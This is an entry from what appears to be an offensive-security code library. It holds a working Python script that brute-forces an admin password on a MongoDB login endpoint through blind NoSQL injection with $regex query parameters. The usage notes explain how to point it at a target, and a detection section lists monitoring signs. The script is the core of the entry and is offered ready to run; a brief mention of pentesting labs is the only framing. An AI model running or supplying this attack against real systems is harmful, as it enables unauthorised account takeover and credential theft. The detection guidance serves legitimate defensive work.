---
id: d8b77203-80d5-4541-848f-d1adfb5eacee
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:31.557336+00:00'
updated_at: '2023-04-10T20:23:02.752178+00:00'
tags:
  - blind-nosql
  - brute-force
  - nosql-injection
platforms:
  - Web
validated: true
---

# Python-MongoDB-Blind-Injection-Brute-Force

## Code

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```

## Description

This Python script performs a blind NoSQL injection brute force attack on a MongoDB login endpoint by iteratively guessing password characters using regex patterns in GET requests. It builds the password prefix incrementally based on application responses indicating a match.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| username | Target username for login | 'admin' |
| u | Full URL of the login endpoint | 'http://example.org/login' |

## Usage

Save the script as a .py file, update the username and u variables with target details, and execute with Python (requires requests library: pip install requests). It runs indefinitely until the full password is guessed. Use in controlled environments like pentesting labs to test NoSQL injection defenses.

## Detection

- Monitor for high volumes of GET requests to login endpoints with regex patterns in password parameters.
- Log analysis for repeated 200 OK responses with specific strings like 'Yeah'.
- Network intrusion detection systems (IDS) rules for brute force patterns targeting authentication paths.
- Application logs showing partial regex matches in NoSQL queries.

## Related

- [[procedures/Blind-NoSQL-Injection-via-Brute-Force]]
